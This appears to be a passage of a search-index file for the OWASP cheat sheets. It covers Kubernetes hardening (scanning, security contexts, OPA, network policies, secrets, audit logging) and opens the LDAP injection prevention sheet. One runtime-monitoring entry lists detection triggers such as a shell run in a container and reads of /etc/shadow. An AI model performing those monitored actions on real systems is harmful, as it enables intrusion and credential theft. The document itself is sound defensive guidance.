haven\u2019t been scanned recently Images that use a base image that\u2019s not whitelisted Images from insecure registries Learn more about webhook at https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#imagepolicywebhook","title":"Create policies to govern image provenance using the ImagePolicyWebhook"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#implement-continuous-security-vulnerability-scanning","text":"New vulnerabilities are published every day and containers might include outdated packages with known vulnerabilities (CVEs). Hence it is recommended to implement an ongoing process, where images are continuously assessed, is crucial to insure a required security posture.","title":"Implement Continuous Security Vulnerability Scanning"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#regularly-apply-security-updates-to-your-environment","text":"In case vulnerabilities are found in running containers, it is recommended to always update the source image and redeploy the containers.","title":"Regularly Apply Security Updates to Your Environment"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#note","text":"Try to avoid direct updates to the running containers as this can break the image-container relationship. Example: apt-update Upgrading containers is extremely easy with the Kubernetes rolling updates feature - this allows gradually updating a running application by upgrading its images to the latest version.","title":"NOTE"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#assess-the-privileges-used-by-containers","text":"The set of capabilities, role bindings, and privileges given to containers can greatly impact your security risk. The goal here is to adhere to the principle of least privilege and provide the minimum privileges and capabilities that would allow the container to perform its intended function. Pod Security Policies are one way to control the security-related attributes of pods, including container privilege levels. These can allow an operator to specify the following: Do not run application processes as root. Do not allow privilege escalation. Use a read-only root filesystem. Use the default (masked) /proc filesystem mount Do not use the host network or process space - using \"hostNetwork:true\" will cause NetworkPolicies to be ignored since the Pod will use its host network. Drop unused and unnecessary Linux capabilities. Use SELinux options for more fine-grained process controls. Give each application its own Kubernetes Service Account. Do not mount the service account credentials in a container if it does not need to access the Kubernetes API. For more information on Pod security policies, refer to the documentation at https://kubernetes.io/docs/concepts/policy/pod-security-policy/ .","title":"Assess the privileges used by containers"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#apply-security-context-to-your-pods-and-containers","text":"A security context is a property defined in the deployment yaml. It controls the security parameters that will be assigned to the pod/container/volume. These controls can eliminate entire classes of attacks that depend on privileged access. Read-only root file systems, for example, can prevent any attack that depends on installing software or writing to the file system. When designing your containers and pods, make sure that you configure the security context for your pods, containers and volumes to grant only the privileges needed for the resource to function. Some of the important parameters are as follows: Security Context Setting Description SecurityContext->runAsNonRoot Indicates that containers should run as non-root user SecurityContext->Capabilities Controls the Linux capabilities assigned to the container. SecurityContext->readOnlyRootFilesystem Controls whether a container will be able to write into the root filesystem. PodSecurityContext->runAsNonRoot Prevents running a container with 'root' user as part of the pod Here is an example for pod definition with security context parameters: apiVersion: v1 kind: Pod metadata: name: hello-world spec: containers: # specification of the pod\u2019s containers # ... # ... # Security Context securityContext: readOnlyRootFilesystem: true runAsNonRoot: true For more information on security context for Pods, refer to the documentation at https://kubernetes.io/docs/tasks/configure-pod-container/security-context","title":"Apply Security Context to Your Pods and Containers"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#implement-service-mesh","text":"A service mesh is an infrastructure layer for microservices applications that can help reduce the complexity of managing microservices and deployments by handling infrastructure service communication quickly, securely and reliably. Service meshes are great at solving operational challenges and issues when running containers and microservices because they provide a uniform way to secure, connect and monitor microservices. Service mesh provides the following advantages:","title":"Implement Service Mesh"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#obeservability","text":"Service Mesh provides tracing and telemetry metrics that make it easy to understand your system and quickly root cause any problems.","title":"Obeservability"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#security","text":"A service mesh provides security features aimed at securing the services inside your network and quickly identifying any compromising traffic entering your cluster. A service mesh can help you more easily manage security through mTLS, ingress and egress control, and more. mTLS and Why it Matters Securing microservices is hard. There are a multitude of tools that address microservices security, but service mesh is the most elegant solution for addressing encryption of on-the-wire traffic within the network. Service mesh provides defense with mutual TLS (mTLS) encryption of the traffic between your services. The mesh can automatically encrypt and decrypt requests and responses, removing that burden from the application developer. It can also improve performance by prioritizing the reuse of existing, persistent connections, reducing the need for the computationally expensive creation of new ones. With service mesh, you can secure traffic over the wire and also make strong identity-based authentication and authorizations for each microservice. We see a lot of value in this for enterprise companies. With a good service mesh, you can see whether mTLS is enabled and working between each of your services and get immediate alerts if security status changes. Ingress & Egress Control Service mesh adds a layer of security that allows you to monitor and address compromising traffic as it enters the mesh. Istio integrates with Kubernetes as an ingress controller and takes care of load balancing for ingress. This allows you to add a level of security at the perimeter with ingress rules. Egress control allows you to see and manage external services and control how your services interact with them.","title":"Security"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#operational-control","text":"A service mesh allows security and platform teams to set the right macro controls to enforce access controls, while allowing developers to make customizations they need to move quickly within these guardrails.","title":"Operational Control"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#rbac","text":"A strong Role Based Access Control (RBAC) system is arguably one of the most critical requirements in large engineering organizations, since even the most secure system can be easily circumvented by overprivileged users or employees. Restricting privileged users to least privileges necessary to perform job responsibilities, ensuring access to systems are set to \u201cdeny all\u201d by default, and ensuring proper documentation detailing roles and responsibilities are in place is one of the most critical security concerns in the enterprise.","title":"RBAC"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#disadvantages","text":"Along with the many advantages, Service mesh also brings in its set of challenges, few of them are listed below: Added Complexity: The introduction of proxies, sidecars and other components into an already sophisticated environment dramatically increases the complexity of development and operations. Required Expertise: Adding a service mesh such as Istio on top of an orchestrator such as Kubernetes often requires operators to become experts in both technologies. Slowness: Service meshes are an invasive and intricate technology that can add significant slowness to an architecture. Adoption of a Platform: The invasiveness of service meshes force both developers and operators to adapt to a highly opinionated platform and conform to its rules.","title":"Disadvantages"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#implementing-open-policy-agent-opa-for-a-centralized-policy-management","text":"OPA is a project that started in 2016 aimed at unifying policy enforcement across different technologies and systems. It can be used to enforce policies on their platforms (like Kubernetes clusters). When it comes to Kubernetes, RBAC and Pod security policies to impose fine-grained control over the cluster. But again, this will only apply to the cluster but not outside the cluster. That\u2019s where Open Policy Agent (OPA) comes into play. OPA was introduced to create a unified method of enforcing security policy in the stack. OPA is a general-purpose, domain-agnostic policy enforcement tool. It can be integrated with APIs, the Linux SSH daemon, an object store like CEPH, etc. OPA designers purposefully avoided basing it on any other project. Accordingly, the policy query and decision do not follow a specific format. That is, you can use any valid JSON data as request attributes as long as it provides the required data. Similarly, the policy decision coming from OPA can also be any valid JSON data. You choose what gets input and what gets output. For example, you can opt to have OPA return a True or False JSON object, a number, a string, or even a complex data object. Currently, OPA is part of CNCF as an incubating project. Most common use cases of OPA: Application authorization OPA enables you to accelerate time to market by providing pre-cooked authorization technology so you don\u2019t have to develop it from scratch. It uses a declarative policy language purpose built for writing and enforcing rules such as, \u201cAlice can write to this repository,\u201d or \u201cBob can update this account.\u201d It comes with a rich suite of tooling to help developers integrate those policies into their applications and even allow the application\u2019s end users to contribute policy for their tenants as well. If you have homegrown application authorization solutions in place, you may not want to rip them out to swap in OPA. At least not yet. But if you are going to be decomposing those monolithic apps and moving to microservices to scale and improve developer efficiency, you\u2019re going to need a distributed authorization system and OPA is the answer. Kubernetes admission control Kubernetes has given developers tremendous control over the traditional silos of compute, networking and storage. Developers today can set up the network the way they want and set up storage the way they want. Administrators and security teams responsible for the well-being of a given container cluster need to make sure developers don\u2019t shoot themselves (or their neighbors) in the foot. OPA can be used to build policies that require, for example, all container images to be from trusted sources, that prevent developers from running software as root, that make sure storage is always marked with the encrypt bit, that storage does not get deleted just because a pod gets restarted, that limits internet access, etc. OPA integrates directly into the Kubernetes API server, so it has complete authority to reject any resource\u2014whether compute, networking, storage, etc.\u2014that policy says doesn\u2019t belong in a cluster. Moreover, you can expose those policies earlier in the development lifecycle (e.g. the CICD pipeline or even on developer laptops) so that developers can receive feedback as early as possible. You can even run policies out-of-band to monitor results so that administrators can ensure policy changes don\u2019t inadvertently do more damage than good. Service mesh authorization And finally, many organizations are using OPA to regulate use of service mesh architectures. So, even if you\u2019re not embedding OPA to implement application authorization logic (the top use case discussed above), you probably still want control over the APIs microservices. You can execute and achieve that by putting authorization policies into the service mesh. Or, you may be motivated by security, and implement policies in the service mesh to limit lateral movement within a microservice architecture. Another common practice is to build policies into the service mesh to ensure your compliance regulations are satisfied even when modification to source code is involved.","title":"Implementing Open Policy Agent (OPA) for a centralized policy management"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#limiting-resource-usage-on-a-cluster","text":"Resource quota limits the number or capacity of resources granted to a namespace. This is most often used to limit the amount of CPU, memory, or persistent disk a namespace can allocate, but can also control how many pods, services, or volumes exist in each namespace. Limit ranges restrict the maximum or minimum size of some of the resources above, to prevent users from requesting unreasonably high or low values for commonly reserved resources like memory, or to provide default limits when none are specified An option of running resource-unbound containers puts your system in risk of DoS or \u201cnoisy neighbor\u201d scenarios. To prevent and minimize those risks you should define resource quotas. By default, all resources in Kubernetes cluster are created with unbounded CPU and memory requests/limits. You can create resource quota policies, attached to Kubernetes namespace, in order to limit the CPU and memory a pod is allowed to consume. The following is an example for namespace resource quota definition that will limit number of pods in the namespace to 4, limiting their CPU requests between 1 and 2 and memory requests between 1GB to 2GB. compute-resources.yaml: apiVersion: v1 kind: ResourceQuota metadata: name: compute-resources spec: hard: pods: \"4\" requests.cpu: \"1\" requests.memory: 1Gi limits.cpu: \"2\" limits.memory: 2Gi Assign a resource quota to namespace: # kubectl create -f ./compute-resources.yaml --namespace=myspace","title":"Limiting resource usage on a cluster"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#use-kubernetes-network-policies-to-control-traffic-between-pods-and-clusters","text":"Running different applications on the same Kubernetes cluster creates a risk of one compromised application attacking a neighboring application. Network segmentation is important to ensure that containers can communicate only with those they are supposed to. By default, Kubernetes allows every pod to contact every other pod. Traffic to a pod from an external network endpoint outside the cluster is allowed if ingress from that endpoint is allowed to the pod. Traffic from a pod to an external network endpoint outside the cluster is allowed if egress is allowed from the pod to that endpoint. Network segmentation policies are a key security control that can prevent lateral movement across containers in the case that an attacker breaks in. One of the challenges in Kubernetes deployments is creating network segmentation between pods, services and containers. This is a challenge due to the \u201cdynamic\u201d nature of container network identities (IPs), along with the fact that containers can communicate both inside the same node or between nodes. Users of Google Cloud Platform can benefit from automatic firewall rules, preventing cross-cluster communication. A similar implementation can be deployed on-premises using network firewalls or SDN solutions. There is work being done in this area by the Kubernetes Network SIG, which will greatly improve the pod-to-pod communication policies. A new network policy API should address the need to create firewall rules around pods, limiting the network access that a containerized can have. The following is an example of a network policy that controls the network for \u201cbackend\u201d pods, only allowing inbound network access from \u201cfrontend\u201d pods: POST /apis/net.alpha.kubernetes.io/v1alpha1/namespaces/tenant-a/networkpolicys { \"kind\" : \"NetworkPolicy\" , \"metadata\" : { \"name\" : \"pol1\" } , \"spec\" : { \"allowIncoming\" : { \"from\" : [{ \"pods\" : { \"segment\" : \"frontend\" } }] , \"toPorts\" : [{ \"port\" : 80 , \"protocol\" : \"TCP\" }] } , \"podSelector\" : { \"segment\" : \"backend\" } } } For more information on configuring network policies, refer to the Kubernetes documentation at https://kubernetes.io/docs/concepts/services-networking/network-policies .","title":"Use Kubernetes network policies to control traffic between pods and clusters"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#securing-data","text":"","title":"Securing data"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#keeps-secrets-as-secrets","text":"In Kubernetes, a Secret is a small object that contains sensitive data, like a password or token. It is necessary to access how sensitive data such as credentials and keys are stored and accessed. Even though a pod is not able to access the secrets of another pod, it is crucial to keep the secret separate from an image or pod. Otherwise, anyone with access to the image would have access to the secret as well. Complex applications that handle multiple processes and have public access are especially vulnerable in this regard. You must ensure that secrets are not being passed as environment variables but are instead mounted into read-only volumes in your containers, for example.","title":"Keeps secrets as secrets"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#encrypt-secrets-at-rest","text":"The etcd database in general contains any information accessible via the Kubernetes API and may grant an attacker significant visibility into the state of your cluster. Always encrypt your backups using a well reviewed backup and encryption solution, and consider using full disk encryption where possible. Kubernetes supports encryption at rest, a feature introduced in 1.7, and beta since 1.13. This will encrypt Secret resources in etcd, preventing parties that gain access to your etcd backups from viewing the content of those secrets. While this feature is currently beta, it offers an additional level of defense when backups are not encrypted or an attacker gains read access to etcd.","title":"Encrypt secrets at rest"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#kubernetes-security-best-practices-runtime-phase","text":"The runtime phase exposes containerized applications to a slew of new security challenges. Your goal here is to both gain visibility into your running environment and detect and respond to threats as they arise. Proactively securing your containers and Kubernetes deployments at the build and deploy phases can greatly reduce the likelihood of security incidents at runtime and the subsequent effort needed to respond to them. First, you must monitor the most security-relevant container activities, including: Process activity Network communications among containerized services Network communications between containerized services and external clients and servers Observing container behavior to detect anomalies is generally easier in containers than in virtual machines because of the declarative nature of containers and Kubernetes. These attributes allow easier introspection into what you have deployed and its expected activity.","title":"Kubernetes Security Best Practices: Runtime Phase"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#use-pod-security-policies-to-prevent-risky-containerspods-from-being-used","text":"PodSecurityPolicy is a cluster-level resources available in Kubernetes (via kubectl) that is highly recommended. You must enable the PodSecurityPolicy admission controller to use it. Given the nature of admission controllers, you must authorize at least one policy - otherwise no pods will be allowed to be created in the cluster. Pod Security Policies address several critical security use cases, including: Preventing containers from running with privileged flag - this type of container will have most of the capabilities available to the underlying host. This flag also overwrites any rules you set using CAP DROP or CAP ADD. Preventing sharing of host PID/IPC namespace, networking, and ports - this step ensures proper isolation between Docker containers and the underlying host Limiting use of volume types - writable hostPath directory volumes, for example, allow containers to write to the filesystem in a manner that allows them to traverse the host filesystem outside the pathPrefix, so readOnly: true must be used Putting limits on host filesystem use Enforcing read only for root file system via the ReadOnlyRootFilesystem Preventing privilege escalation to root privileges Rejecting containers with root privileges Restricting Linux capabilities to bare minimum in adherence with least privilege principles For more information on Pod security policies, refer to the documentation at https://kubernetes.io/docs/concepts/policy/pod-security-policy/ .","title":"Use Pod Security Policies to prevent risky containers/Pods from being used"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#container-runtime-security","text":"Hardening containers at runtime gives security teams the ability to detect and respond to threats and anomalies while the containers or workloads are in a running state. This is typically carried out by intercepting the low-level system calls and looking for events that may indicate compromise. Some examples of events that should trigger an alert would include: A shell is run inside a container A container mounts a sensitive path from the host such as /proc A sensitive file is unexpectedly read in a running container such as /etc/shadow An outbound network connection is established Open source tools such as Falco from Sysdig are available to help operators get up an running with container runtime security by providing a large number of out-of-the-box detections as well as the flexibility to create custom rules.","title":"Container Runtime Security"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#container-sandboxing","text":"Container runtimes typically are permitted to make direct calls to the host kernel then the kernel interacts with hardware and devices to respond to the request. Cgroups and namespaces exist to give containers a certain amount of isolation but the still kernel presents a large attack surface area. Often times in multi-tenant and highly untrusted clusters an additional layer of sandboxing is required to ensure container breakout and kernel exploits are not present. Below we will explore a few OSS technologies that help further isolate running containers from the host kernel: Kata Containers: Kata Containers is OSS project that uses stripped-down VMs to keep the resource footprint minimal and maximize performance to ultimately isolate containers further. gVisor : gVisor is a more lightweight than a VM (even stripped down). gVisor is its own independent kernel written in Go to sit in the middle of a container and the host kernel. Strong sandbox. gVisor supports ~70% of the linux system calls from the container but ONLY users about 20 system calls to the host kernel. Firecracker: Firecracker super lightweight VM that runs in user space. Locked down by seccomp, cgroup and namespace policies so system calls are very limited. Firecracker is built with security in mind but may not support all Kubernetes or container runtime deployments.","title":"Container Sandboxing"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#preventing-containers-from-loading-unwanted-kernel-modules","text":"The Linux kernel automatically loads kernel modules from disk if needed in certain circumstances, such as when a piece of hardware is attached or a filesystem is mounted. Of particular relevance to Kubernetes, even unprivileged processes can cause certain network-protocol-related kernel modules to be loaded, just by creating a socket of the appropriate type. This may allow an attacker to exploit a security hole in a kernel module that the administrator assumed was not in use. To prevent specific modules from being automatically loaded, you can uninstall them from the node, or add rules to block them. On most Linux distributions, you can do that by creating a file such as /etc/modprobe.d/kubernetes-blacklist.conf with contents like: # DCCP is unlikely to be needed, has had multiple serious # vulnerabilities, and is not well-maintained. blacklist dccp # SCTP is not used in most Kubernetes clusters, and has also had # vulnerabilities in the past. blacklist sctp To block module loading more generically, you can use a Linux Security Module (such as SELinux) to completely deny the module_request permission to containers, preventing the kernel from loading modules for containers under any circumstances. (Pods would still be able to use modules that had been loaded manually, or modules that were loaded by the kernel on behalf of some more-privileged process.","title":"Preventing containers from loading unwanted kernel modules"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#compare-and-analyze-different-runtime-activity-in-pods-of-the-same-deployments","text":"Containerized applications are replicated for high availability, fault tolerance, or scale reasons. Replicas should behave nearly identically; replicas with significant deviations from the others warrant further investigation. Integrate your Kubernetes security tool with other external systems (email, PagerDuty, Slack, Google Cloud Security Command Center, SIEMs [security information and event management], etc.) and leverage deployment labels or annotations to alert the team responsible for a given application when a potential threat is detected. Commercial Kubernetes security vendors should support a wide array of integrations with external tools","title":"Compare and analyze different runtime activity in pods of the same deployments"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#monitor-network-traffic-to-limit-unnecessary-or-insecure-communication","text":"Observe your active network traffic and compare that traffic to what is allowed based on your Kubernetes network policies. Containerized applications typically make extensive use of cluster networking, and observing active networking traffic is a good way to understand how applications interact with each other and identify unexpected communication. At the same time, comparing the active traffic with what\u2019s allowed gives you valuable information about what isn\u2019t happening but is allowed. With that information, you can further tighten your allowed network policies so that it removes superfluous connections and decreases your attack surface. Open source projects like https://github.com/kinvolk/inspektor-gadget may help with this, and commercial security solutions provide varying degrees of container network traffic analysis.","title":"Monitor network traffic to limit unnecessary or insecure communication"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#if-breached-scale-suspicious-pods-to-zero","text":"Use Kubernetes native controls to contain a successful breach by automatically instructing Kubernetes to scale suspicious pods to zero or kill then restart instances of breached applications.","title":"If breached, scale suspicious pods to zero"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#rotate-infrastructure-credentials-frequently","text":"The shorter the lifetime of a secret or credential the harder it is for an attacker to make use of that credential. Set short lifetimes on certificates and automate their rotation. Use an authentication provider that can control how long issued tokens are available and use short lifetimes where possible. If you use service account tokens in external integrations, plan to rotate those tokens frequently. For example, once the bootstrap phase is complete, a bootstrap token used for setting up nodes should be revoked or its authorization removed.","title":"Rotate infrastructure credentials frequently"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#receiving-alerts-for-security-updates-and-reporting-vulnerabilities","text":"Join the kubernetes-announce group (< https://kubernetes.io/docs/reference/issues-security/security/ ) for emails about security announcements. See the security reporting page ( https://kubernetes.io/docs/reference/issues-security/security ) for more on how to report vulnerabilities.","title":"Receiving alerts for security updates and reporting vulnerabilities"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#logging","text":"Kubernetes supplies cluster-based logging, allowing to log container activity into a central log hub. When a cluster is created, the standard output and standard error output of each container can be ingested using a Fluentd agent running on each node into either Google Stackdriver Logging or into Elasticsearch and viewed with Kibana.","title":"Logging"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#enable-audit-logging","text":"The audit logger is a beta feature that records actions taken by the API for later analysis in the event of a compromise. It is recommended to enable audit logging and archive the audit file on a secure server Ensure logs are monitoring for anomalous or unwanted API calls, especially any authorization failures (these log entries will have a status message \u201cForbidden\u201d). Authorization failures could mean that an attacker is trying to abuse stolen credentials. Managed Kubernetes providers, including GKE, provide access to this data in their cloud console and may allow you to set up alerts on authorization failures.","title":"Enable audit logging"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#audit-logs","text":"Audit logs can be useful for compliance as they should help you answer the questions of what happened, who did what and when. Kubernetes provides flexible auditing of kube-apiserver requests based on policies. These help you track all activities in chronological order. Here is an example of an audit log: { \"kind\" : \"Event\" , \"apiVersion\" : \"audit.k8s.io/v1beta1\" , \"metadata\" : { \"creationTimestamp\" : \"2019-08-22T12:00:00Z\" } , \"level\" : \"Metadata\" , \"timestamp\" : \"2019-08-22T12:00:00Z\" , \"auditID\" : \"23bc44ds-2452-242g-fsf2-4242fe3ggfes\" , \"stage\" : \"RequestReceived\" , \"requestURI\" : \"/api/v1/namespaces/default/persistentvolumeclaims\" , \"verb\" : \"list\" , \"user\" : { \"username\" : \"user@example.org\" , \"groups\" : [ \"system:authenticated\" ] } , \"sourceIPs\" : [ \"172.12.56.1\" ] , \"objectRef\" : { \"resource\" : \"persistentvolumeclaims\" , \"namespace\" : \"default\" , \"apiVersion\" : \"v1\" } , \"requestReceivedTimestamp\" : \"2019-08-22T12:00:00Z\" , \"stageTimestamp\" : \"2019-08-22T12:00:00Z\" }","title":"Audit logs"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#define-audit-policies","text":"Audit policy defines rules about what events should be recorded and what data they should include. The audit policy object structure is defined in the audit.k8s.io API group. When an event is processed, it's compared against the list of rules in order. The first matching rule sets the \"audit level\" of the event. The known audit levels are as follows: None - don't log events that match this rule. Metadata - log request metadata (requesting user, timestamp, resource, verb, etc.) but not request or response body. Request - log event metadata and request body but not response body. This does not apply for non-resource requests. RequestResponse - log event metadata, request and response bodies. This does not apply for non-resource requests. You can pass a file with the policy to kube-apiserver using the --audit-policy-file flag. If the flag is omitted, no events are logged. Note that the rules field must be provided in the audit policy file. A policy with no (0) rules is treated as illegal.","title":"Define Audit Policies"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#understanding-logging","text":"One main challenge with logging Kubernetes is understanding what logs are generated and how to use them. Let\u2019s start by examining the Kubernetes logging architecture from a birds eye view.","title":"Understanding Logging"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#container-logging","text":"The first layer of logs that can be collected from a Kubernetes cluster are those being generated by your containerized applications. The easiest method for logging containers is to write to the standard output (stdout) and standard error (stderr) streams. Manifest is as follows. ```YAML apiVersion: v1 kind: Pod metadata: name: example spec: containers: - name: example image: busybox args: [/bin/sh, -c, 'while true; do echo $(date); sleep 1; done'] ``` To apply the manifest, run: ```bash kubectl apply -f example.yaml ``` To take a look the logs for this container, run: ```bash kubectl log <container-name> command. ``` For persisting container logs, the common approach is to write logs to a log file and then use a sidecar container. As shown below in the pod configuration above, a sidecar container will run in the same pod along with the application container, mounting the same volume and processing the logs separately. Pod Manifest is as follows: YAML apiVersion: v1 kind: Pod metadata: name: example spec: containers: - name: example image: busybox args: - /bin/sh - -c - > while true; do echo \"$(date)\\n\" >> /var/log/example.log; sleep 1; done volumeMounts: - name: varlog mountPath: /var/log - name: sidecar image: busybox args: [/bin/sh, -c, 'tail -f /var/log/example.log'] volumeMounts: - name: varlog mountPath: /var/log volumes: - name: varlog emptyDir: {}","title":"Container logging"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#node-logging","text":"When a container running on Kubernetes writes its logs to stdout or stderr streams, the container engine streams them to the logging driver configured in Kubernetes. In most cases, these logs will end up in the /var/log/containers directory on your host. Docker supports multiple logging drivers but unfortunately, driver configuration is not supported via the Kubernetes API. Once a container is terminated or restarted, kubelet stores logs on the node. To prevent these files from consuming all of the host\u2019s storage, the Kubernetes node implements a log rotation mechanism. When a container is evicted from the node, all containers with corresponding log files are evicted. Depending on what operating system and additional services you\u2019re running on your host machine, you might need to take a look at additional logs. For example, systemd logs can be retrieved using the following command: bash journalctl -u","title":"Node logging"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#cluster-logging","text":"On the level of the Kubernetes cluster itself, there is a long list of cluster components that can be logged as well as additional data types that can be used (events, audit logs). Together, these different types of data can give you visibility into how Kubernetes is performing as a ystem. Some of these components run in a container, and some of them run on the operating system level (in most cases, a systemd service). The systemd services write to journald, and components running in containers write logs to the /var/log directory, unless the container engine has been configured to stream logs differently.","title":"Cluster logging"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#events","text":"Kubernetes events can indicate any Kubernetes resource state changes and errors, such as exceeded resource quota or pending pods, as well as any informational messages. Kubernetes events can indicate any Kubernetes resource state changes and errors, such as exceeded resource quota or pending pods, as well as any informational messages. The following command returns all events within a specific namespace: ```bash kubectl get events -n NAMESPACE LAST SEEN TYPE REASON OBJECT MESSAGE kube-system 8m22s Normal Scheduled pod/metrics-server-66dbbb67db-lh865 Successfully assigned kube-system/metrics-server-66dbbb67db-lh865 to aks-agentpool-42213468-1 kube-system 8m14s Normal Pulling pod/metrics-server-66dbbb67db-lh865 Pulling image \"aksrepos.azurecr.io/mirror/metrics-server-amd64:v0.2.1\" kube-system 7m58s Normal Pulled pod/metrics-server-66dbbb67db-lh865 Successfully pulled image \"aksrepos.azurecr.io/mirror/metrics-server-amd64:v0.2.1\" kube-system 7m57s Normal Created pod/metrics-server-66dbbb67db-lh865 Created container metrics-server kube-system 7m57s Normal Started pod/metrics-server-66dbbb67db-lh865 Started container metrics-server kube-system 8m23s Normal SuccessfulCreate replicaset/metrics-server-66dbbb67db Created pod: metrics-server-66dbbb67db-lh865 ``` The following command will show the latest events for this specific Kubernetes resource: kubectl describe pod <pod-name> Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 14m default-scheduler Successfully assigned kube-system/coredns-7b54b5b97c-dpll7 to aks-agentpool-42213468-1 Normal Pulled 13m kubelet, aks-agentpool-42213468-1 Container image \"aksrepos.azurecr.io/mirror/coredns:1.3.1\" already present on machine Normal Created 13m kubelet, aks-agentpool-42213468-1 Created container coredns Normal Started 13m kubelet, aks-agentpool-42213468-1 Started container coredns","title":"Events"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#final-thoughts","text":"","title":"Final thoughts"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#embed-security-earlier-into-the-container-lifecycle","text":"You must integrate security earlier into the container lifecycle and ensure alignment and shared goals between security and DevOps teams. Security can (and should) be an enabler that allows your developers and DevOps teams to confidently build and deploy applications that are production-ready for scale, stability and security.","title":"Embed security earlier into the container lifecycle"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#use-kubernetes-native-security-controls-to-reduce-operational-risk","text":"Leverage the native controls built into Kubernetes whenever available in order to enforce security policies so that your security controls don\u2019t collide with the orchestrator. Instead of using a third-party proxy or shim to enforce network segmentation, as an example, use Kubernetes network policies to ensure secure network communication.","title":"Use Kubernetes-native security controls to reduce operational risk"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#leverage-the-context-that-kubernetes-provides-to-prioritize-remediation-efforts","text":"In sprawling Kubernetes environments, manually triaging security incidents and policy violations is time consuming. For example, a deployment containing a vulnerability with severity score of 7 or greater should be moved up in remediation priority if that deployment contains privileged containers and is open to the Internet but moved down if it\u2019s in a test environment and supporting a non-critical app.","title":"Leverage the context that Kubernetes provides to prioritize remediation efforts"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#references","text":"Master documentation - https://kubernetes.io Kubernetes Security Best Practices everyone must follow - https://www.cncf.io/blog/2019/01/14/9-kubernetes-security-best-practices-everyone-must-follow Securing a Cluster - https://kubernetes.io/blog/2016/08/security-best-practices-kubernetes-deployment Security Best Practices for Kubernetes Deployment - https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster Kubernetes Security Best Practices - https://phoenixnap.com/kb/kubernetes-security-best-practices Kubernetes Security 101: Risks and 29 Best Practices - https://www.stackrox.com/post/2020/05/kubernetes-security-101 15 Kubernetes security best practice to secure your cluster - https://www.mobilise.cloud/15-kubernetes-security-best-practice-to-secure-your-cluster The Ultimate Guide to Kubernetes Security - https://neuvector.com/container-security/kubernetes-security-guide A hacker's guide to Kubernetes security - https://techbeacon.com/enterprise-it/hackers-guide-kubernetes-security 11 Ways (Not) to Get Hacked - https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked 12 Kubernetes configuration best practices - https://www.stackrox.com/post/2019/09/12-kubernetes-configuration-best-practices/#6-securely-configure-the-kubernetes-api-server A Practical Guide to Kubernetes Logging - https://logz.io/blog/a-practical-guide-to-kubernetes-logging Kubernetes Web UI (Dashboard) - https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard Tesla cloud resources are hacked to run cryptocurrency-mining malware - https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware OPEN POLICY AGENT: CLOUD-NATIVE AUTHORIZATION - https://blog.styra.com/blog/open-policy-agent-authorization-for-the-cloud Introducing Policy As Code: The Open Policy Agent (OPA) - https://www.magalix.com/blog/introducing-policy-as-code-the-open-policy-agent-opa What service mesh provides - https://aspenmesh.io/what-service-mesh-provides Three Technical Benefits of Service Meshes and their Operational Limitations, Part 1 - https://glasnostic.com/blog/service-mesh-istio-limits-and-benefits-part-1","title":"References"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html","text":"LDAP Injection Prevention Cheat Sheet \u00b6 Introduction \u00b6 This cheatsheet is focused on providing clear, simple, actionable guidance for preventing LDAP Injection flaws in your applications. LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements through techniques similar to SQL Injection . LDAP injection attacks could result in the granting of permissions to unauthorized queries, and content modification inside the LDAP tree. For more information on LDAP Injection attacks, visit LDAP injection . LDAP injection attacks are common due to two factors: The lack of safer, parameterized LDAP query interfaces The widespread use of LDAP to authenticate users to systems. Primary Defenses: Escape all variables using the right 